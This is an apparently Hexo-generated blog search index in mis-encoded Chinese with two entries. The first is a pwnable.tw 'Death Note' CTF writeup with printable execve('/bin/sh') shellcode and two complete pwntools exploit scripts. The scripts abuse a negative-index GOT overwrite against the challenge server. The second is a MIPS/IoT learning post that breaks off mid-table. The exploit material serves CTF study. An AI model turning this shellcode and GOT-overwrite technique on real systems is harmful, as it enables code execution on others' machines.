<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pwnable.tw writeup-Death Note</title>
    <url>/2024/07/27/Death-Note/</url>
    <content><![CDATA[<h2 id="å­¦ä¹ ä¸æ”¶è·"><a href="#å­¦ä¹ ä¸æ”¶è·" class="headerlink" title="å­¦ä¹ ä¸æ”¶è·"></a>å­¦ä¹ ä¸æ”¶è·</h2><ol>
<li><p>è®¤è¯†äº†ä¸‰ä¸ªæ±‡ç¼–æŒ‡ä»¤ï¼Œ<br><code>dec</code>ï¼šå°†æ“ä½œæ•°çš„å€¼å‡å»<code>1</code>ã€‚å¦‚ï¼Œ<code>edx</code>çš„å€¼åŸæ¥ä¸º<code>0x30</code>ï¼Œæ‰§è¡Œ<code>dec edx</code>åï¼Œ<code>edx</code>çš„å€¼å˜ä¸º<code>0x2f</code>ã€‚<br><code>inc</code>ï¼šå°†æ“ä½œæ•°çš„å€¼åŠ ä¸Š<code>1</code>ã€‚å¦‚ï¼Œ<code>eax</code>çš„å€¼åŸæ¥ä¸º<code>0</code>ï¼Œæ‰§è¡Œ<code>inc eax</code>åï¼Œ<code>eax</code>çš„å€¼å˜ä¸º<code>0x1</code>ã€‚</p>
<span id="more"></span>

<p><code>xor</code>ï¼šå°†ä¸¤ä¸ªæ“ä½œæ•°çš„å€¼è¿›è¡Œå¼‚æˆ–ã€‚å¼‚æˆ–ï¼Œä¸¤ä¸ªäºŒè¿›åˆ¶æ•°ï¼Œå¯¹åº”ä½å¼‚æˆ–ï¼ŒåŒä¸º<code>0</code>ï¼Œä¸åŒä¸º<code>1</code>ã€‚</p>
</li>
<li><p>å¯¹äº<code>32</code>ä½çš„å¯„å­˜å™¨<code>edx</code>ï¼Œ<code>dl</code>æ˜¯å…¶ä½<code>8</code>ä½ï¼Œå³æœ€å<code>1</code>ä¸ªå­—èŠ‚ï¼›<code>dh</code>æ˜¯å…¶é«˜<code>8</code>ä½ï¼Œå³ç¬¬<code>1</code>ä¸ªå­—èŠ‚ã€‚</p>
</li>
<li><p>å¯¹äº<code>syscall</code>å’Œ<code>int 0x80</code>çš„ä¸å¯è§å­—ç¬¦æ±‡ç¼–ä»£ç ç¼–å†™ï¼Œ<br><code>syscall</code>çš„æœºå™¨ç æ˜¯<code>\x0f\x05</code>ï¼Œ<code>int 0x80</code>çš„æœºå™¨ç æ˜¯<code>\xCD\x80</code>ã€‚è¿™ä¸¤ä¸ªæŒ‡ä»¤éƒ½æ˜¯æ±‡ç¼–æŒ‡ä»¤ï¼Œæ•…å…¶åœ¨å†…å­˜ä¸­çš„å­˜å‚¨å½¢å¼æ˜¯æœºå™¨ç ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœ<code>0x08048020</code>è¿™ä¸ªåœ°å€é‡Œï¼Œå­˜å‚¨çš„æ•°æ®æ˜¯<code>0x80cd</code>ï¼Œä¾¿å¯ä»¥ç†è§£ä¸ºåœ°å€<code>0x08048020</code>å­˜å‚¨ç€<code>int 0x80</code>è¿™ä¸ªæŒ‡ä»¤ã€‚</p>
</li>
</ol>
<h2 id="æ•´ä½“æ€è·¯"><a href="#æ•´ä½“æ€è·¯" class="headerlink" title="æ•´ä½“æ€è·¯"></a>æ•´ä½“æ€è·¯</h2><p>ç¨‹åºæ²¡æœ‰å¼€<em>pie</em>ä¿æŠ¤ï¼Œå¯èƒ½è¦ç”¨åˆ°<em>shellcode</em>ã€‚ç¨‹åºä¸»è¦åŠŸèƒ½æ˜¯å®ç°<em>chunk</em>çš„åˆ›å»ºï¼Œæ‰“å°ï¼Œåˆ é™¤ã€‚åœ¨åˆ›å»º<em>chunk</em>çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªç´¢å¼•è¶Šç•Œæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å…¥è´Ÿæ•°ï¼Œè¦†ç›–<em>note</em>æ•°ç»„å‰é¢çš„å†…å®¹ä¸º<em>chunk_hook</em>ã€‚</p>
<p>é€šè¿‡ä»¥ä¸Šæ–¹æ³•ï¼Œè¦†ç›–<code>free@got.plt</code>ï¼Œä¸ºä¸€ä¸ª<em>chunk_hook</em>ï¼Œè¯¥<em>chunk_hook</em>æŒ‡å‘<em>chunk</em>çš„<em>user_data</em>ã€‚å¦‚æœæˆ‘ä»¬æŠŠ<em>shellcode</em>å¸ƒç½®åœ¨<em>chunk</em>ä¸­ï¼Œé‚£ä¹ˆåœ¨åˆ é™¤<em>chunk</em>çš„æ—¶å€™ï¼Œä¾¿ä¼šæ‰§è¡Œ<em>shellcode</em>ã€‚</p>
<p>è¯¥é¢˜è€ƒå¯Ÿäº†å…³äºå¯è§å­—ç¬¦<em>shellcode</em>çš„ç¼–å†™ï¼Œä¸èƒ½ä½¿ç”¨<em>mov</em>ï¼Œ<em>syscall</em>ï¼Œ<em>int 0x80</em>ç­‰ï¼Œæˆ‘ä¾¿å­¦ä¹ ç”¨<em>push,pop,dec,inc,xor</em>æ¥ç¼–å†™<code>32</code>ä½çš„<em>execve</em>çš„ç³»ç»Ÿè°ƒç”¨ã€‚</p>
<h4 id="dec"><a href="#dec" class="headerlink" title="dec"></a><em>dec</em></h4><blockquote>
<p>æ±‡ç¼–æŒ‡ä»¤<code>dec</code>æ˜¯â€decrementâ€çš„ç¼©å†™ï¼Œæ„æ€æ˜¯å°†æ“ä½œæ•°çš„å€¼å‡å»1ã€‚åœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼Œ<code>dec</code>æŒ‡ä»¤é€šå¸¸ç”¨äºå‡å°‘å¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®ä¸­çš„æ•°å€¼ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæœ‰ä¸€ä¸ªå¯„å­˜å™¨Açš„å½“å‰å€¼ä¸º5ï¼Œæ‰§è¡Œ<code>dec A</code>åï¼Œå¯„å­˜å™¨Açš„å€¼å°†å˜ä¸º4ã€‚</p>
<p><code>dec</code>æŒ‡ä»¤å¯ä»¥åº”ç”¨äºä¸åŒçš„ä¸Šä¸‹æ–‡å’Œæ•°æ®ç±»å‹ï¼Œå…·ä½“è¡Œä¸ºå¯èƒ½å› ä½¿ç”¨çš„CPUæ¶æ„å’Œæ±‡ç¼–è¯­è¨€çš„å˜ç§è€Œæœ‰æ‰€ä¸åŒã€‚åœ¨ä¸€äº›æ¶æ„ä¸­ï¼Œ<code>dec</code>å¯èƒ½åªå½±å“æ— ç¬¦å·æ•´æ•°ï¼Œè€Œåœ¨å…¶ä»–æ¶æ„ä¸­ï¼Œå®ƒå¯èƒ½é€‚ç”¨äºæœ‰ç¬¦å·æ•´æ•°ã€‚ä½¿ç”¨æ—¶éœ€è¦å‚è€ƒç‰¹å®šå¤„ç†å™¨çš„æŒ‡ä»¤é›†æ¶æ„ï¼ˆISAï¼‰æ–‡æ¡£ã€‚</p>
</blockquote>
<h4 id="inc"><a href="#inc" class="headerlink" title="inc"></a><em>inc</em></h4><blockquote>
<p>æ±‡ç¼–æŒ‡ä»¤<code>inc</code>æ˜¯â€incrementâ€çš„ç¼©å†™ï¼Œæ„æ€æ˜¯å°†æ“ä½œæ•°çš„å€¼å¢åŠ 1ã€‚è¿™ä¸ªæŒ‡ä»¤é€šå¸¸ç”¨äºå¯„å­˜å™¨æˆ–å†…å­˜ä½ç½®ä¸­çš„æ•°å€¼å¢åŠ æ“ä½œã€‚</p>
<p>ä¾‹å¦‚ï¼Œå¦‚æœæœ‰ä¸€ä¸ªå¯„å­˜å™¨Bçš„å½“å‰å€¼ä¸º3ï¼Œæ‰§è¡Œ<code>inc B</code>åï¼Œå¯„å­˜å™¨Bçš„å€¼å°†å˜ä¸º4ã€‚</p>
<p>ä¸<code>dec</code>æŒ‡ä»¤ç±»ä¼¼ï¼Œ<code>inc</code>çš„å…·ä½“è¡Œä¸ºå¯èƒ½å› ä½¿ç”¨çš„CPUæ¶æ„å’Œæ±‡ç¼–è¯­è¨€çš„å˜ç§è€Œæœ‰æ‰€ä¸åŒã€‚åœ¨æŸäº›æ¶æ„ä¸­ï¼Œ<code>inc</code>å¯èƒ½åªå½±å“æ— ç¬¦å·æ•´æ•°ï¼Œè€Œåœ¨å…¶ä»–æ¶æ„ä¸­ï¼Œå®ƒå¯èƒ½é€‚ç”¨äºæœ‰ç¬¦å·æ•´æ•°ã€‚ä½¿ç”¨æ—¶åŒæ ·éœ€è¦å‚è€ƒç‰¹å®šå¤„ç†å™¨çš„æŒ‡ä»¤é›†æ¶æ„ï¼ˆISAï¼‰æ–‡æ¡£ã€‚</p>
</blockquote>
<h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a><em>shellcode</em></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#execve(&quot;/bin/sh&quot;,0,0) eax = 11</span><br><span class="line">#ebx,ecx,edx</span><br><span class="line">/*   å°†&#x27;/bin//sh&#x27;çš„åœ°å€æ”¾åˆ°ebxä¸­</span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">push esp</span><br><span class="line">pop ebx</span><br><span class="line">push edx</span><br><span class="line">*/</span><br><span class="line">dec edx   #edx-1</span><br><span class="line">dec edx</span><br><span class="line">xor [eax+36], dl</span><br><span class="line">xor [eax+37], dl</span><br><span class="line">pop edx</span><br><span class="line">/*   eax = 11</span><br><span class="line">push ecx</span><br><span class="line">pop eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax	</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">inc eax</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><h3 id="æœ¬åœ°"><a href="#æœ¬åœ°" class="headerlink" title="æœ¬åœ°"></a>æœ¬åœ°</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./death_note&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10201</span>)</span><br><span class="line">debug(p,<span class="number">0x080489EF</span>,<span class="number">0x080489FD</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Name :&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	push ebx</span></span><br><span class="line"><span class="string">	push 0x68732f2f</span></span><br><span class="line"><span class="string">	push 0x6e69622f</span></span><br><span class="line"><span class="string">	push esp</span></span><br><span class="line"><span class="string">	pop ebx</span></span><br><span class="line"><span class="string">    dec ecx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">    xor [eax+56],dl</span></span><br><span class="line"><span class="string">    xor [eax+57],dl</span></span><br><span class="line"><span class="string">	pop edi</span></span><br><span class="line"><span class="string">    pop edi</span></span><br><span class="line"><span class="string">	pop eax</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    inc edx</span></span><br><span class="line"><span class="string">    dec edx</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode) + <span class="string">b&#x27;\x3a\x77&#x27;</span></span><br><span class="line">add(-<span class="number">19</span>,shellcode)</span><br><span class="line">delete(-<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="è¿œç¨‹"><a href="#è¿œç¨‹" class="headerlink" title="è¿œç¨‹"></a>è¿œç¨‹</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./death_note&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10201</span>)</span><br><span class="line">debug(p,<span class="number">0x080489EF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Name :&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	push ebx</span></span><br><span class="line"><span class="string">	push 0x68732f2f</span></span><br><span class="line"><span class="string">	push 0x6e69622f</span></span><br><span class="line"><span class="string">	push esp</span></span><br><span class="line"><span class="string">	pop ebx</span></span><br><span class="line"><span class="string">	push edx</span></span><br><span class="line"><span class="string">	dec edx</span></span><br><span class="line"><span class="string">	dec edx</span></span><br><span class="line"><span class="string">	xor [eax+36], dl</span></span><br><span class="line"><span class="string">	xor [eax+37], dl</span></span><br><span class="line"><span class="string">	pop edx</span></span><br><span class="line"><span class="string">	push ecx</span></span><br><span class="line"><span class="string">	pop eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	inc eax</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode) + <span class="string">b&#x27;\x33\x7e&#x27;</span></span><br><span class="line">add(-<span class="number">19</span>,shellcode)</span><br><span class="line">delete(-<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwnable.twåˆ·é¢˜</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>æ ˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>IOTå…¥é—¨ä¹‹MIPSæ¶æ„åŸºç¡€çŸ¥è¯†å­¦ä¹ </title>
    <url>/2025/03/03/IOT%E5%85%A5%E9%97%A8%E4%B9%8BMIPS%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>èŠ±äº†å‡ å¤©çš„æ—¶é—´æ¥å­¦ä¹ MIPSï¼Œå…ˆä»è°ƒè¯•ä¸€æ®µç®€å•çš„ä»£ç å¼€å§‹ï¼Œçœ‹çœ‹MIPSæ±‡ç¼–æŒ‡ä»¤æ˜¯æ€ä¹ˆè¿›è¡Œä¸€ç³»åˆ—æ“ä½œçš„ï¼Œç„¶åå»äº†è§£å„ä¸ªæŒ‡ä»¤çš„å«ä¹‰å’Œå¯„å­˜å™¨çš„ç”¨é€”ï¼Œé‡åˆ°ä¸æ˜“ç†è§£çš„å°±åœ¨gdbä¸­è°ƒè¯•ä¸€ä¸‹ï¼Œæ¥ç€å°±æ˜¯å…¶å‡½æ•°è°ƒç”¨çº¦å®šåŠç›¸å…³ç‰¹æ€§ï¼Œæœ€åæ˜¯ç¼–å†™MIPSæ±‡ç¼–çš„shellcodeã€‚å­¦å®Œè¿™äº›ç´§æ¥ç€å°±å»å¤ç°æ¼æ´äº†ï¼Œä¹Ÿæ²¡å¥½å¥½æ€»ç»“ä¸€ä¸‹ï¼Œå¤ç°å®Œæ¼æ´åè¿˜æ˜¯è§‰å¾—è¦æ¢³ç†ä¸€ä¸‹MIPSçš„ç›¸å…³çŸ¥è¯†ï¼Œæƒ³äº†æƒ³å†™ç¯‡æ–‡ç« æ€»ç»“æ˜¯å†å¥½ä¸è¿‡äº†ï¼Œå› æ­¤åˆèŠ±äº†ä¸å°‘æ—¶é—´å†™äº†ä¸‹é¢è¿™äº›å†…å®¹ã€‚</p>
<span id="more"></span>

<p>å­¦ä¹ è¿‡ç¨‹ä¸­å‚è€ƒäº†ä¸å°‘å¸ˆå‚…å†™çš„æ–‡ç« ï¼Œå¤§ä½¬ä»¬å†™çš„éƒ½éå¸¸å¥½éå¸¸æ„Ÿè°¢ï¼Œé“¾æ¥æ”¾åœ¨æœ€åäº†ã€‚æœ¬äººèœé¸Ÿä¸€æšï¼Œå¦‚æœ‰ä¸å¯¹è¯·æŒ‡å‡ºï¼Œè°¢è°¢åŒ…å®¹^_^</p>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>æœ€å¼€å§‹çš„å¼€å§‹å½“ç„¶æ˜¯å…ˆæ­å»ºå¥½ç¯å¢ƒï¼Œæ­å»ºäº¤å‰ç¼–è¯‘ç¯å¢ƒå’Œqemuï¼Œè°ƒè¯•è¿˜è¦å®‰è£…gdb-multiarchï¼Œè¿™ä¸€éƒ¨åˆ†å°±ä¸ç»†è¯´äº†ï¼Œå†…å®¹ä¸å¤šå°±ä¸‹é¢å‡ æ¡å‘½ä»¤ã€‚ï¼ˆå…¶å®åœ¨è¿™ä¸€æ­¥æˆ‘å·²ç»è¸©äº†æ— æ•°å‘ğŸ˜€ğŸ‘</p>
<h3 id="å®‰è£…qemuã€mipsä¾èµ–åº“ã€gdb-multiarch"><a href="#å®‰è£…qemuã€mipsä¾èµ–åº“ã€gdb-multiarch" class="headerlink" title="å®‰è£…qemuã€mipsä¾èµ–åº“ã€gdb-multiarch"></a>å®‰è£…qemuã€mipsä¾èµ–åº“ã€gdb-multiarch</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install qemu</span><br><span class="line">sudo apt install qemu-user-static binfmt-support qemu-user qemu-system</span><br><span class="line">sudo apt-get install gcc-mips-linux-gnu</span><br><span class="line">sudo apt-get install gcc-mipsel-linux-gnu</span><br><span class="line">sudo apt-get install gcc-mips64-linux-gnuabi64</span><br><span class="line">sudo apt-get install gcc-mips64el-linux-gnuabi64</span><br><span class="line">sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…buildrootäº¤å‰ç¼–è¯‘ç¯å¢ƒ"><a href="#å®‰è£…buildrootäº¤å‰ç¼–è¯‘ç¯å¢ƒ" class="headerlink" title="å®‰è£…buildrootäº¤å‰ç¼–è¯‘ç¯å¢ƒ"></a>å®‰è£…buildrootäº¤å‰ç¼–è¯‘ç¯å¢ƒ</h3><p>å»<a href="https://buildroot.org/">buildroot.org</a>ä¸‹è½½buildroot-2024.02.11.tar.gz</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf buildroot-2019.02.4.tar.gz</span><br><span class="line">make clean</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>target options-&gt;target arch</code>é€‰é¡¹é‡Œé¢é€‰æ‹©è‡ªå·±è¦ç¼–è¯‘çš„æ¶æ„ï¼Œè¿™é‡Œé€‰æ‹©<code>MIPS(Little endian)</code>ï¼Œä»£è¡¨MIPSå°ç«¯åºã€‚<code>toolchain</code>ä¸­è¿˜è¦é€‰æ‹©Cè¯­è¨€åº“ï¼Œè¿™é‡Œé€‰<code>uGlibc</code>ã€‚</p>
<p>è®¾ç½®ç¯å¢ƒå˜é‡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export PATH=/home/wen/Desktop/buildroot-2024.02.11/output/host/bin:\$PATH&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>

<h2 id="ç¨‹åºå¯åŠ¨è°ƒè¯•"><a href="#ç¨‹åºå¯åŠ¨è°ƒè¯•" class="headerlink" title="ç¨‹åºå¯åŠ¨è°ƒè¯•"></a>ç¨‹åºå¯åŠ¨è°ƒè¯•</h2><p>demo.cï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> age = <span class="number">7</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;My age is %d.\n&quot;</span>,age);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šé¢demo.cç¨‹åºä¸ºä¾‹ï¼Œæ‰§è¡Œä¸‹é¢æŒ‡ä»¤æ¥å¯åŠ¨ç¨‹åºï¼š<br>æ³¨ï¼šmipså’Œmipselçš„åŒºåˆ«æ˜¯å‰è€…ä¸ºå¤§ç«¯åºï¼Œåè€…ä¸ºå°ç«¯åºï¼Œ<code>readelf -h demo</code>å¯ä»¥æŸ¥çœ‹ç¨‹åºçš„å­—èŠ‚åºã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç¼–è¯‘</span></span><br><span class="line">mips-linux-gnu-gcc demo.c -o demo -static -g <span class="comment">#-staticæ˜¯é™æ€é“¾æ¥</span></span><br><span class="line"><span class="comment">#è¿è¡Œ</span></span><br><span class="line">qemu-mips ./demo   <span class="comment">#ï¼ˆå¤§ç«¯åº</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¦ç›´æ¥è°ƒè¯•ç¨‹åºï¼Œå…ˆæ‰§è¡Œ<code>qemu-mips -g 6666 ./demo</code>ï¼Œç„¶ååœ¨å¦ä¸€ä¸ªç»ˆç«¯ï¼Œæ‰§è¡Œä¸‹é¢è¿™å‡ æ¡å‘½ä»¤ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line"><span class="built_in">set</span> architecture mips   <span class="comment">#è®¾ç½®æ¶æ„ä¸ºmips</span></span><br><span class="line"><span class="built_in">set</span> endian big   <span class="comment">#è®¾ç½®ç«¯åºä¸ºå¤§ç«¯åº</span></span><br><span class="line">symbol-file ./demo   <span class="comment">#æ·»åŠ ç¬¦å·è¡¨</span></span><br><span class="line">target remote localhost:6666</span><br></pre></td></tr></table></figure>

<p>å¦‚ä¸‹ï¼š</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503121514052.png" alt="image-20250310092641519" style="zoom:67%;" />

<p>ä¸Šé¢è¿™ç§æƒ…å†µæ˜¯è°ƒè¯•é™æ€é“¾æ¥çš„ç¨‹åºï¼Œå¦‚æœç¨‹åºæ˜¯åŠ¨æ€é“¾æ¥çš„ï¼Œå…ˆæ‰§è¡Œ<code>qemu-mips -g 6666 ./demo</code>ï¼Œç„¶åæ‰§è¡Œè¿™å‡ æ¡å‘½ä»¤å³å¯ã€‚</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">gdb-mutiarch</span><br><span class="line"><span class="keyword">file</span> ./demo</span><br><span class="line"><span class="keyword">target</span> remote localhost:<span class="number">6666</span></span><br></pre></td></tr></table></figure>

<h2 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h2><h3 id="é€šç”¨å¯„å­˜å™¨"><a href="#é€šç”¨å¯„å­˜å™¨" class="headerlink" title="é€šç”¨å¯„å­˜å™¨"></a>é€šç”¨å¯„å­˜å™¨</h3><p>MIPSæ¶æ„ä¸­æœ‰32ä¸ªé€šç”¨å¯„å­˜å™¨ï¼Œåœ¨æ±‡ç¼–ç¨‹åºä¸­å¯ä»¥ç”¨ç¼–å·è¡¨ç¤ºï¼Œä¹Ÿå¯ä»¥ç”¨å¯„å­˜å™¨çš„åç§°æ¥è¡¨ç¤ºï¼Œå„ä¸ªé€šç”¨å¯„å­˜å™¨çš„è¯¦ç»†ä¿¡æ¯å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š</p>
<table>
<thead>
<tr>
<th align="left">ç¼–å·</th>
<th>åç§°</th>
<th>æè¿°</th>
<th>å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$0</td>
<td>$zero</td>
<td>å¸¸é‡å¯„å­˜å™¨ï¼Œå€¼ä¸º0</td>
<td></td>
</tr>
<tr>
<td align="left">$1</td>
<td>$at</td>
<td>ä¸ºæ±‡ç¼–å™¨ä¿ç•™çš„å¯„å­˜å™¨ï¼Œä¸»è¦ç”¨äºå¤„ç†ä¼ªæŒ‡ä»¤å’ŒåŠ è½½å¤§å¸¸æ•°ã€‚</td>
<td>Assembler Temporary</td>
</tr>
<tr>
<td align="left">$2~$3</td>
<td>$v0~$v1</td>
<td>å­˜å‚¨è¡¨è¾¾å¼æˆ–å‡½æ•°è¿”å›å€¼</td>
<td>Values</td>
</tr>
<tr>
<td align="left">$4~$7</td>
<td>$a0~$a3</td>
<td>å‡½æ•°è°ƒç”¨æ—¶ï¼Œç”¨æ¥å­˜å‚¨å‰å››ä¸ªå‚æ•°</td>
<td>Arguments</td>
</tr>
<tr>
<td align="left">$8~$15</td>
<td>$t0~$t7</td>
<td>ä¸´æ—¶å¯„å­˜å™¨ï¼Œå­˜æ”¾ä¸´æ—¶å˜é‡</td>
<td>Temporaries</td>
</tr>
<tr>
<td align="left">$16~$23</td>
<td>$s0~$s7</td>
<td>ä¿å­˜å¯„å­˜å™¨ï¼Œç”¨äºä¿å­˜å‡½æ•°è°ƒç”¨ä¹‹é—´çš„çŠ¶æ€ï¼ˆå³å¯„å­˜å™¨çš„å€¼ï¼‰ï¼ˆä¸$t0~$t9ç›¸åï¼‰</td>
<td>Saved Values</td>
</tr>
<tr>
<td align="left">$24~$25</td>
<td>$t8~$t9</td>
<td>ä¸´æ—¶å¯„å­˜å™¨</td>
<td>Temporaries</td>
</tr>
<tr>
<td align="left">$26~$27</td>
<td>$k0~$k1</td>
<td>ç”¨äºä¿å­˜å¼‚å¸¸å¤„ç†å’Œä¸­æ–­çš„è¿”å›å€¼ï¼Œä¸ºæ“ä½œç³»ç»Ÿ<code>Keep</code>ä½¿ç”¨</td>
<td>Kernel reserved</td>
</tr>
<tr>
<td align="left">$28</td>
<td>$gp</td>
<td>å…¨å±€æŒ‡é’ˆ</td>
<td>Global Pointer</td>
</tr>
<tr>
<td align="left">$29</td>
<td>$sp</td>
<td>å †æ ˆæŒ‡é’ˆï¼Œä¼šæŒ‡å‘æ ˆé¡¶</td>
<td>Stack Pointer</td>
</tr>
<tr>
<td align="left">$30</td>
<td>$s8&#x2F;$fp</td>
<td>å¯ä»¥ä½œä¸ºç¬¬ä¹ä¸ªä¿å­˜å¯„å­˜å™¨($s8)ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºæ ˆå¸§æŒ‡é’ˆ($fp)ä¿å­˜æ ˆæŒ‡é’ˆ</td>
<td>Saved value &#x2F; Frame Pointer</td>
</tr>
